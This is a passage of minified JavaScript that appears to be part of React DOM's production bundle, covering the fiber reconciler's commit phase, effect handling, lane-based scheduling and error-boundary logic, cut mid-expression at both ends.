te(n),null;if(r=(n.flags&128)!==0,i=l.rendering,i===null)if(r)vt(l,!1);else{if(G!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(i=Qr(e),i!==null){for(n.flags|=128,vt(l,!1),r=i.updateQueue,r!==null&&(n.updateQueue=r,n.flags|=4),n.subtreeFlags=0,r=t,t=n.child;t!==null;)l=t,e=r,l.flags&=14680066,i=l.alternate,i===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=i.childLanes,l.lanes=i.lanes,l.child=i.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=i.memoizedProps,l.memoizedState=i.memoizedState,l.updateQueue=i.updateQueue,l.type=i.type,e=i.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return _(H,H.current&1|2),n.child}e=e.sibling}l.tail!==null&&$()>lt&&(n.flags|=128,r=!0,vt(l,!1),n.lanes=4194304)}else{if(!r)if(e=Qr(i),e!==null){if(n.flags|=128,r=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),vt(l,!0),l.tail===null&&l.tailMode==="hidden"&&!i.alternate&&!F)return te(n),null}else 2*$()-l.renderingStartTime>lt&&t!==1073741824&&(n.flags|=128,r=!0,vt(l,!1),n.lanes=4194304);l.isBackwards?(i.sibling=n.child,n.child=i):(t=l.last,t!==null?t.sibling=i:n.child=i,l.last=i)}return l.tail!==null?(n=l.tail,l.rendering=n,l.tail=n.sibling,l.renderingStartTime=$(),n.sibling=null,t=H.current,_(H,r?t&1|2:t&1),n):(te(n),null);case 22:case 23:return Ri(),r=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(n.flags|=8192),r&&n.mode&1?me&1073741824&&(te(n),n.subtreeFlags&6&&(n.flags|=8192)):te(n),null;case 24:return null;case 25:return null}throw Error(v(156,n.tag))}function mf(e,n){switch(ai(n),n.tag){case 1:return fe(n.type)&&Ur(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return rt(),A(de),A(oe),vi(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return gi(n),null;case 13:if(A(H),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(v(340));nt()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return A(H),null;case 4:return rt(),null;case 10:return fi(n.type._context),null;case 22:case 23:return Ri(),null;case 24:return null;default:return null}}var gr=!1,re=!1,hf=typeof WeakSet=="function"?WeakSet:Set,C=null;function $n(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(r){B(e,n,r)}else t.current=null}function Ll(e,n,t){try{t()}catch(r){B(e,n,r)}}var _s=!1;function gf(e,n){if(gl=Ar,e=Ja(),ii(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var r=t.getSelection&&t.getSelection();if(r&&r.rangeCount!==0){t=r.anchorNode;var o=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{t.nodeType,l.nodeType}catch{t=null;break e}var i=0,s=-1,a=-1,c=0,p=0,h=e,m=null;n:for(;;){for(var S;h!==t||o!==0&&h.nodeType!==3||(s=i+o),h!==l||r!==0&&h.nodeType!==3||(a=i+r),h.nodeType===3&&(i+=h.nodeValue.length),(S=h.firstChild)!==null;)m=h,h=S;for(;;){if(h===e)break n;if(m===t&&++c===o&&(s=i),m===l&&++p===r&&(a=i),(S=h.nextSibling)!==null)break;h=m,m=h.parentNode}h=S}t=s===-1||a===-1?null:{start:s,end:a}}else t=null}t=t||{start:0,end:0}}else t=null;for(vl={focusedElem:e,selectionRange:t},Ar=!1,C=n;C!==null;)if(n=C,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,C=e;else for(;C!==null;){n=C;try{var w=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var k=w.memoizedProps,z=w.memoizedState,d=n.stateNode,u=d.getSnapshotBeforeUpdate(n.elementType===n.type?k:Re(n.type,k),z);d.__reactInternalSnapshotBeforeUpdate=u}break;case 3:var f=n.stateNode.containerInfo;f.nodeType===1?f.textContent="":f.nodeType===9&&f.documentElement&&f.removeChild(f.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(v(163))}}catch(g){B(n,n.return,g)}if(e=n.sibling,e!==null){e.return=n.return,C=e;break}C=n.return}return w=_s,_s=!1,w}function Nt(e,n,t){var r=n.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var o=r=r.next;do{if((o.tag&e)===e){var l=o.destroy;o.destroy=void 0,l!==void 0&&Ll(n,t,l)}o=o.next}while(o!==r)}}function fo(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var r=t.create;t.destroy=r()}t=t.next}while(t!==n)}}function _l(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function Uu(e){var n=e.alternate;n!==null&&(e.alternate=null,Uu(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[ze],delete n[Bt],delete n[wl],delete n[Yd],delete n[Zd])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Vu(e){return e.tag===5||e.tag===3||e.tag===4}function Is(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Vu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Il(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Hr));else if(r!==4&&(e=e.child,e!==null))for(Il(e,n,t),e=e.sibling;e!==null;)Il(e,n,t),e=e.sibling}function Al(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(Al(e,n,t),e=e.sibling;e!==null;)Al(e,n,t),e=e.sibling}var Z=null,Ne=!1;function be(e,n,t){for(t=t.child;t!==null;)Bu(e,n,t),t=t.sibling}function Bu(e,n,t){if(Fe&&typeof Fe.onCommitFiberUnmount=="function")try{Fe.onCommitFiberUnmount(ro,t)}catch{}switch(t.tag){case 5:re||$n(t,n);case 6:var r=Z,o=Ne;Z=null,be(e,n,t),Z=r,Ne=o,Z!==null&&(Ne?(e=Z,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):Z.removeChild(t.stateNode));break;case 18:Z!==null&&(Ne?(e=Z,t=t.stateNode,e.nodeType===8?Fo(e.parentNode,t):e.nodeType===1&&Fo(e,t),zt(e)):Fo(Z,t.stateNode));break;case 4:r=Z,o=Ne,Z=t.stateNode.containerInfo,Ne=!0,be(e,n,t),Z=r,Ne=o;break;case 0:case 11:case 14:case 15:if(!re&&(r=t.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){o=r=r.next;do{var l=o,i=l.destroy;l=l.tag,i!==void 0&&(l&2||l&4)&&Ll(t,n,i),o=o.next}while(o!==r)}be(e,n,t);break;case 1:if(!re&&($n(t,n),r=t.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=t.memoizedProps,r.state=t.memoizedState,r.componentWillUnmount()}catch(s){B(t,n,s)}be(e,n,t);break;case 21:be(e,n,t);break;case 22:t.mode&1?(re=(r=re)||t.memoizedState!==null,be(e,n,t),re=r):be(e,n,t);break;default:be(e,n,t)}}function As(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new hf),n.forEach(function(r){var o=Pf.bind(null,e,r);t.has(r)||(t.add(r),r.then(o,o))})}}function je(e,n){var t=n.deletions;if(t!==null)for(var r=0;r<t.length;r++){var o=t[r];try{var l=e,i=n,s=i;e:for(;s!==null;){switch(s.tag){case 5:Z=s.stateNode,Ne=!1;break e;case 3:Z=s.stateNode.containerInfo,Ne=!0;break e;case 4:Z=s.stateNode.containerInfo,Ne=!0;break e}s=s.return}if(Z===null)throw Error(v(160));Bu(l,i,o),Z=null,Ne=!1;var a=o.alternate;a!==null&&(a.return=null),o.return=null}catch(c){B(o,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)Wu(n,e),n=n.sibling}function Wu(e,n){var t=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(je(n,e),Ie(e),r&4){try{Nt(3,e,e.return),fo(3,e)}catch(k){B(e,e.return,k)}try{Nt(5,e,e.return)}catch(k){B(e,e.return,k)}}break;case 1:je(n,e),Ie(e),r&512&&t!==null&&$n(t,t.return);break;case 5:if(je(n,e),Ie(e),r&512&&t!==null&&$n(t,t.return),e.flags&32){var o=e.stateNode;try{Lt(o,"")}catch(k){B(e,e.return,k)}}if(r&4&&(o=e.stateNode,o!=null)){var l=e.memoizedProps,i=t!==null?t.memoizedProps:l,s=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{s==="input"&&l.type==="radio"&&l.name!=null&&da(o,l),il(s,i);var c=il(s,l);for(i=0;i<a.length;i+=2){var p=a[i],h=a[i+1];p==="style"?ga(o,h):p==="dangerouslySetInnerHTML"?ma(o,h):p==="children"?Lt(o,h):Ql(o,p,h,c)}switch(s){case"input":nl(o,l);break;case"textarea":fa(o,l);break;case"select":var m=o._wrapperState.wasMultiple;o._wrapperState.wasMultiple=!!l.multiple;var S=l.value;S!=null?Qn(o,!!l.multiple,S,!1):m!==!!l.multiple&&(l.defaultValue!=null?Qn(o,!!l.multiple,l.defaultValue,!0):Qn(o,!!l.multiple,l.multiple?[]:"",!1))}o[Bt]=l}catch(k){B(e,e.return,k)}}break;case 6:if(je(n,e),Ie(e),r&4){if(e.stateNode===null)throw Error(v(162));o=e.stateNode,l=e.memoizedProps;try{o.nodeValue=l}catch(k){B(e,e.return,k)}}break;case 3:if(je(n,e),Ie(e),r&4&&t!==null&&t.memoizedState.isDehydrated)try{zt(n.containerInfo)}catch(k){B(e,e.return,k)}break;case 4:je(n,e),Ie(e);break;case 13:je(n,e),Ie(e),o=e.child,o.flags&8192&&(l=o.memoizedState!==null,o.stateNode.isHidden=l,!l||o.alternate!==null&&o.alternate.memoizedState!==null||(Ei=$())),r&4&&As(e);break;case 22:if(p=t!==null&&t.memoizedState!==null,e.mode&1?(re=(c=re)||p,je(n,e),re=c):je(n,e),Ie(e),r&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!p&&e.mode&1)for(C=e,p=e.child;p!==null;){for(h=C=p;C!==null;){switch(m=C,S=m.child,m.tag){case 0:case 11:case 14:case 15:Nt(4,m,m.return);break;case 1:$n(m,m.return);var w=m.stateNode;if(typeof w.componentWillUnmount=="function"){r=m,t=m.return;try{n=r,w.props=n.memoizedProps,w.state=n.memoizedState,w.componentWillUnmount()}catch(k){B(r,t,k)}}break;case 5:$n(m,m.return);break;case 22:if(m.memoizedState!==null){Fs(h);continue}}S!==null?(S.return=m,C=S):Fs(h)}p=p.sibling}e:for(p=null,h=e;;){if(h.tag===5){if(p===null){p=h;try{o=h.stateNode,c?(l=o.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(s=h.stateNode,a=h.memoizedProps.style,i=a!=null&&a.hasOwnProperty("display")?a.display:null,s.style.display=ha("display",i))}catch(k){B(e,e.return,k)}}}else if(h.tag===6){if(p===null)try{h.stateNode.nodeValue=c?"":h.memoizedProps}catch(k){B(e,e.return,k)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;p===h&&(p=null),h=h.return}p===h&&(p=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:je(n,e),Ie(e),r&4&&As(e);break;case 21:break;default:je(n,e),Ie(e)}}function Ie(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(Vu(t)){var r=t;break e}t=t.return}throw Error(v(160))}switch(r.tag){case 5:var o=r.stateNode;r.flags&32&&(Lt(o,""),r.flags&=-33);var l=Is(e);Al(e,l,o);break;case 3:case 4:var i=r.stateNode.containerInfo,s=Is(e);Il(e,s,i);break;default:throw Error(v(161))}}catch(a){B(e,e.return,a)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function vf(e,n,t){C=e,Ju(e)}function Ju(e,n,t){for(var r=(e.mode&1)!==0;C!==null;){var o=C,l=o.child;if(o.tag===22&&r){var i=o.memoizedState!==null||gr;if(!i){var s=o.alternate,a=s!==null&&s.memoizedState!==null||re;s=gr;var c=re;if(gr=i,(re=a)&&!c)for(C=o;C!==null;)i=C,a=i.child,i.tag===22&&i.memoizedState!==null?Hs(o):a!==null?(a.return=i,C=a):Hs(o);for(;l!==null;)C=l,Ju(l),l=l.sibling;C=o,gr=s,re=c}zs(e)}else o.subtreeFlags&8772&&l!==null?(l.return=o,C=l):zs(e)}}function zs(e){for(;C!==null;){var n=C;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:re||fo(5,n);break;case 1:var r=n.stateNode;if(n.flags&4&&!re)if(t===null)r.componentDidMount();else{var o=n.elementType===n.type?t.memoizedProps:Re(n.type,t.memoizedProps);r.componentDidUpdate(o,t.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=n.updateQueue;l!==null&&ks(n,l,r);break;case 3:var i=n.updateQueue;if(i!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}ks(n,i,t)}break;case 5:var s=n.stateNode;if(t===null&&n.flags&4){t=s;var a=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&t.focus();break;case"img":a.src&&(t.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var p=c.memoizedState;if(p!==null){var h=p.dehydrated;h!==null&&zt(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(v(163))}re||n.flags&512&&_l(n)}catch(m){B(n,n.return,m)}}if(n===e){C=null;break}if(t=n.sibling,t!==null){t.return=n.return,C=t;break}C=n.return}}function Fs(e){for(;C!==null;){var n=C;if(n===e){C=null;break}var t=n.sibling;if(t!==null){t.return=n.return,C=t;break}C=n.return}}function Hs(e){for(;C!==null;){var n=C;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{fo(4,n)}catch(a){B(n,t,a)}break;case 1:var r=n.stateNode;if(typeof r.componentDidMount=="function"){var o=n.return;try{r.componentDidMount()}catch(a){B(n,o,a)}}var l=n.return;try{_l(n)}catch(a){B(n,l,a)}break;case 5:var i=n.return;try{_l(n)}catch(a){B(n,i,a)}}}catch(a){B(n,n.return,a)}if(n===e){C=null;break}var s=n.sibling;if(s!==null){s.return=n.return,C=s;break}C=n.return}}var yf=Math.ceil,br=Xe.ReactCurrentDispatcher,xi=Xe.ReactCurrentOwner,Te=Xe.ReactCurrentBatchConfig,D=0,Y=null,K=null,q=0,me=0,Kn=hn(0),G=0,Gt=null,Nn=0,po=0,Pi=0,Mt=null,ue=null,Ei=0,lt=1/0,Ue=null,Yr=!1,zl=null,un=null,vr=!1,tn=null,Zr=0,Ot=0,Fl=null,Rr=-1,Nr=0;function ie(){return D&6?$():Rr!==-1?Rr:Rr=$()}function cn(e){return e.mode&1?D&2&&q!==0?q&-q:ef.transition!==null?(Nr===0&&(Nr=Ra()),Nr):(e=L,e!==0||(e=window.event,e=e===void 0?16:Ia(e.type)),e):1}function Le(e,n,t,r){if(50<Ot)throw Ot=0,Fl=null,Error(v(185));bt(e,t,r),(!(D&2)||e!==Y)&&(e===Y&&(!(D&2)&&(po|=t),G===4&&en(e,q)),pe(e,r),t===1&&D===0&&!(n.mode&1)&&(lt=$()+500,ao&&gn()))}function pe(e,n){var t=e.callbackNode;ed(e,n);var r=Ir(e,e===Y?q:0);if(r===0)t!==null&&Gi(t),e.callbackNode=null,e.callbackPriority=0;else if(n=r&-r,e.callbackPriority!==n){if(t!=null&&Gi(t),n===1)e.tag===0?qd(Us.bind(null,e)):eu(Us.bind(null,e)),Xd(function(){!(D&6)&&gn()}),t=null;else{switch(Na(r)){case 1:t=Zl;break;case 4:t=Ea;break;case 16:t=_r;break;case 536870912:t=ja;break;default:t=_r}t=Zu(t,$u.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function $u(e,n){if(Rr=-1,Nr=0,D&6)throw Error(v(327));var t=e.callbackNode;if(Zn()&&e.callbackNode!==t)return null;var r=Ir(e,e===Y?q:0);if(r===0)return null;if(r&30||r&e.expiredLanes||n)n=qr(e,r);else{n=r;var o=D;D|=2;var l=Qu();(Y!==e||q!==n)&&(Ue=null,lt=$()+500,xn(e,n));do try{kf();break}catch(s){Ku(e,s)}while(!0);di(),br.current=l,D=o,K!==null?n=0:(Y=null,q=0,n=G)}if(n!==0){if(n===2&&(o=dl(e),o!==0&&(r=o,n=Hl(e,o))),n===1)throw t=Gt,xn(e,0),en(e,r),pe(e,$()),t;if(n===6)en(e,r);else{if(o=e.current.alternate,!(r&30)&&!Sf(o)&&(n=qr(e,r),n===2&&(l=dl(e),l!==0&&(r=l,n=Hl(e,l))),n===1))throw t=Gt,xn(e,0),en(e,r),pe(e,$()),t;switch(e.finishedWork=o,e.finishedLanes=r,n){case 0:case 1:throw Error(v(345));case 2:wn(e,ue,Ue);break;case 3:if(en(e,r),(r&130023424)===r&&(n=Ei+500-$(),10<n)){if(Ir(e,0)!==0)break;if(o=e.suspendedLanes,(o&r)!==r){ie(),e.pingedLanes|=e.suspendedLanes&o;break}e.timeoutHandle=Sl(wn.bind(null,e,ue,Ue),n);break}wn(e,ue,Ue);break;case 4:if(en(e,r),(r&4194240)===r)break;for(n=e.eventTimes,o=-1;0<r;){var i=31-De(r);l=1<<i,i=n[i],i>o&&(o=i),r&=~l}if(r=o,r=$()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*yf(r/1960))-r,10<r){e.timeoutHandle=Sl(wn.bind(null,e,ue,Ue),r);break}wn(e,ue,Ue);break;case 5:wn(e,ue,Ue);break;default:throw Error(v(329))}}}return pe(e,$()),e.callbackNode===t?$u.bind(null,e):null}function Hl(e,n){var t=Mt;return e.current.memoizedState.isDehydrated&&(xn(e,n).flags|=256),e=qr(e,n),e!==2&&(n=ue,ue=t,n!==null&&Ul(n)),e}function Ul(e){ue===null?ue=e:ue.push.apply(ue,e)}function Sf(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var r=0;r<t.length;r++){var o=t[r],l=o.getSnapshot;o=o.value;try{if(!_e(l(),o))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function en(e,n){for(n&=~Pi,n&=~po,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-De(n),r=1<<t;e[t]=-1,n&=~r}}function Us(e){if(D&6)throw Error(v(327));Zn();var n=Ir(e,0);if(!(n&1))return pe(e,$()),null;var t=qr(e,n);if(e.tag!==0&&t===2){var r=dl(e);r!==0&&(n=r,t=Hl(e,r))}if(t===1)throw t=Gt,xn(e,0),en(e,n),pe(e,$()),t;if(t===6)throw Error(v(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,wn(e,ue,Ue),pe(e,$()),null}function ji(e,n){var t=D;D|=1;try{return e(n)}finally{D=t,D===0&&(lt=$()+500,ao&&gn())}}function Mn(e){tn!==null&&tn.tag===0&&!(D&6)&&Zn();var n=D;D|=1;var t=Te.transition,r=L;try{if(Te.transition=null,L=1,e)return e()}finally{L=r,Te.transition=t,D=n,!(D&6)&&gn()}}function Ri(){me=Kn.current,A(Kn)}function xn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Gd(t)),K!==null)for(t=K.return;t!==null;){var r=t;switch(ai(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Ur();break;case 3:rt(),A(de),A(oe),vi();break;case 5:gi(r);break;case 4:rt();break;case 13:A(H);break;case 19:A(H);break;case 10:fi(r.type._context);break;case 22:case 23:Ri()}t=t.return}if(Y=e,K=e=dn(e.current,null),q=me=n,G=0,Gt=null,Pi=po=Nn=0,ue=Mt=null,Cn!==null){for(n=0;n<Cn.length;n++)if(t=Cn[n],r=t.interleaved,r!==null){t.interleaved=null;var o=r.next,l=t.pending;if(l!==null){var i=l.next;l.next=o,r.next=i}t.pending=r}Cn=null}return e}function Ku(e,n){do{var t=K;try{if(di(),Pr.current=Xr,Gr){for(var r=U.memoizedState;r!==null;){var o=r.queue;o!==null&&(o.pending=null),r=r.next}Gr=!1}if(Rn=0,b=Q=U=null,Rt=!1,$t=0,xi.current=null,t===null||t.return===null){G=1,Gt=n,K=null;break}e:{var l=e,i=t.return,s=t,a=n;if(n=q,s.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var c=a,p=s,h=p.tag;if(!(p.mode&1)&&(h===0||h===11||h===15)){var m=p.alternate;m?(p.updateQueue=m.updateQueue,p.memoizedState=m.memoizedState,p.lanes=m.lanes):(p.updateQueue=null,p.memoizedState=null)}var S=js(i);if(S!==null){S.flags&=-257,Rs(S,i,s,l,n),S.mode&1&&Es(l,c,n),n=S,a=c;var w=n.updateQueue;if(w===null){var k=new Set;k.add(a),n.updateQueue=k}else w.add(a);break e}else{if(!(n&1)){Es(l,c,n),Ni();break e}a=Error(v(426))}}else if(F&&s.mode&1){var z=js(i);if(z!==null){!(z.flags&65536)&&(z.flags|=256),Rs(z,i,s,l,n),ui(ot(a,s));break e}}l=a=ot(a,s),G!==4&&(G=2),Mt===null?Mt=[l]:Mt.push(l),l=i;do{switch(l.tag){case 3:l.flags|=65536,n&=-n,l.lanes|=n;var d=Nu(l,a,n);ws(l,d);break e;case 1:s=a;var u=l.type,f=l.stateNode;if(!(l.flags&128)&&(typeof u.getDerivedStateFromError=="function"||f!==null&&typeof f.componentDidCatch=="function"&&(un===null||!un.has(f)))){l.flags|=65536,n&=-n,l.lanes|=n;var g=Mu(l,s,n);ws(l,g);break e}}l=l.return}while(l!==null)}Xu(t)}catch(T){n=T,K===t&&t!==null&&(K=t=t.return);continue}break}while(!0)}function Qu(){var e=br.current;return br.current=Xr,e===null?Xr:e}function Ni(){(G===0||G===3||G===2)&&(G=4),Y===null||!(Nn&268435455)&&!(po&268435455)||en(Y,q)}function qr(e,n){var t=D;D|=2;var r=Qu();(Y!==e||q!==n)&&(Ue=null,xn(e,n));do try{wf();break}catch(o){Ku(e,o)}while(!0);if(di(),D=t,br.current=r,K!==null)throw Error(v(261));return Y=null,q=0,G}function wf(){for(;K!==null;)Gu(K)}function kf(){for(;K!==null&&!$c();)Gu(K)}function Gu(e){var n=Yu(e.alternate,e,me);e.memoizedProps=e.pendingProps,n===null?Xu(e):K=n,xi.current=null}function Xu(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=mf(t,n),t!==null){t.flags&=32767,K=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{G=6,K=null;return}}else if(t=pf(t,n,me),t!==null){K=t;return}if(n=n.sibling,n!==null){K=n;return}K=n=e}while(n!==null);G===0&&(G=5)}function wn(e,n,t){var r=L,o=Te.transition;try{Te.transition=null,L=1,Cf(e,n,t,r)}finally{Te.transition=o,L=r}return null}function Cf(e,n,t,r){do Zn();while(tn!==null);if(D&6)throw Error(v(327));t=e.finishedWork;var o=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(v(177));e.callbackNode=null,e.callbackPriority=0;var l=t.lanes|t.childLanes;if(nd(e,l),e===Y&&(K=Y=null,q=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||vr||(vr=!0,Zu(_r,function(){return Zn(),null})),l=(t.flags&15990)!==0,t.subtreeFlags&15990||l){l=Te.transition,Te.transition=null;var i=L;L=1;var s=D;D|=4,xi.current=null,gf(e,t),Wu(t,e),Vd(vl),Ar=!!gl,vl=gl=null,e.current=t,vf(t),Kc(),D=s,L=i,Te.transition=l}else e.current=t;if(vr&&(vr=!1,tn=e,Zr=o),l=e.pendingLanes,l===0&&(un=null),Xc(t.stateNode),pe(e,$()),n!==null)for(r=e.onRecoverableError,t=0;t<n.length;t++)o=n[t],r(o.value,{componentStack:o.stack,digest:o.digest});if(Yr)throw Yr=!1,e=zl,zl=null,e;return Zr&1&&e.tag!==0&&Zn(),l=e.pendingLanes,l&1?e===Fl?Ot++:(Ot=0,Fl=e):Ot=0,gn(),null}function Zn(){if(tn!==null){var e=Na(Zr),n=Te.transition,t=L;try{if(Te.transition=null,L=16>e?16:e,tn===null)var r=!1;else{if(e=tn,tn=null,Zr=0,D&6)throw Error(v(331));var o=D;for(D|=4,C=e.current;C!==null;){var l=C,i=l.child;if(C.flags&16){var s=l.deletions;if(s!==null){for(var a=0;a<s.length;a++){var c=s[a];for(C=c;C!==null;){var p=C;switch(p.tag){case 0:case 11:case 15:Nt(8,p,l)}var h=p.child;if(h!==null)h.return=p,C=h;else for(;C!==null;){p=C;var m=p.sibling,S=p.return;if(Uu(p),p===c){C=null;break}if(m!==null){m.return=S,C=m;break}C=S}}}var w=l.alternate;if(w!==null){var k=w.child;if(k!==null){w.child=null;do{var z=k.sibling;k.sibling=null,k=z}while(k!==null)}}C=l}}if(l.subtreeFlags&2064&&i!==null)i.return=l,C=i;else e:for(;C!==null;){if(l=C,l.flags&2048)switch(l.tag){case 0:case 11:case 15:Nt(9,l,l.return)}var d=l.sibling;if(d!==null){d.return=l.return,C=d;break e}C=l.return}}var u=e.current;for(C=u;C!==null;){i=C;var f=i.child;if(i.subtreeFlags&2064&&f!==null)f.return=i,C=f;else e:for(i=u;C!==null;){if(s=C,s.flags&2048)try{switch(s.tag){case 0:case 11:case 15:fo(9,s)}}catch(T){B(s,s.return,T)}if(s===i){C=null;break e}var g=s.sibling;if(g!==null){g.return=s.return,C=g;break e}C=s.return}}if(D=o,gn(),Fe&&typeof Fe.onPostCommitFiberRoot=="function")try{Fe.onPostCommitFiberRoot(ro,e)}catch{}r=!0}return r}finally{L=t,Te.transition=n}}return!1}function Vs(e,n,t){n=ot(t,n),n=Nu(e,n,1),e=an(e,n,1),n=ie(),e!==null&&(bt(e,1,n),pe(e,n))}function B(e,n,t){if(e.tag===3)Vs(e,e,t);else for(;n!==null;){if(n.tag===3){Vs(n,e,t);break}else if(n.tag===1){var r=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(un===null||!un.has(r))){e=ot(t,e),e=Mu(n,e,1),n=an(n,e,1),e=ie(),n!==null&&(bt(n,1,e),pe(n,e));break}}n=n.return}}function Tf(e,n,t){var r=e.pingCache;r!==null&&r.delete(n),n=ie(),e.pingedLanes|=e.suspendedLanes&t,Y===e&&(q&t)===t&&(G===4||G===3&&(q&130023424)===q&&500>$()-Ei?xn(e,0):Pi|=t),pe(e,n)}function bu(e,n){n===0&&(e.mode&1?(n=sr,sr<<=1,!(sr&130023424)&&(sr=4194304)):n=1);var t=ie();e=Qe(e,n),e!==null&&(bt(e,n,t),pe(e,t))}function xf(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),bu(e,t)}function Pf(e,n){var t=0;switch(e.tag){case 13:var r=e.stateNode,o=e.memoizedState;o!==null&&(t=o.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(v(314))}r!==null&&r.delete(n),bu(e,t)}var Yu;Yu=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||de.current)ce=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return ce=!1,ff(e,n,t);ce=!!(e.flags&131072)}else ce=!1,F&&n.flags&1048576&&nu(n,Wr,n.index);switch(n.lanes=0,n.tag){case 2:var r=n.type;jr(e,n),e=n.pendingProps;var o=et(n,oe.current);Yn(n,t),o=Si(null,n,r,e,o,t);var l=wi();return n.flags|=1,typeof o=="object"&&o!==null&&typeof o.render=="function"&&o.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,fe(r)?(l=!0,Vr(n)):l=!1,n.memoizedState=o.state!==null&&o.state!==void 0?o.state:null,mi(n),o.updater=co,n.stateNode=o,o._reactInternals=n,El(n,r,e,t),n=Nl(null,n,r,!0,l,t)):(n.tag=0,F&&l&&si(n),le(null,n,o,t),n=n.child),n;case 16:r=n.elementType;e:{switch(jr(e,n),e=n.pendingProps,o=r._init,r=o(r._payload),n.type=r,o=n.tag=jf(r),e=Re(r,e),o){case 0:n=Rl(null,n,r,e,t);break e;case 1:n=Os(null,n,r,e,t);break e;case 11:n=Ns(null,n,r,e,t);break e;case 14:n=Ms(null,n,r,Re(r.type,e),t);break e}throw 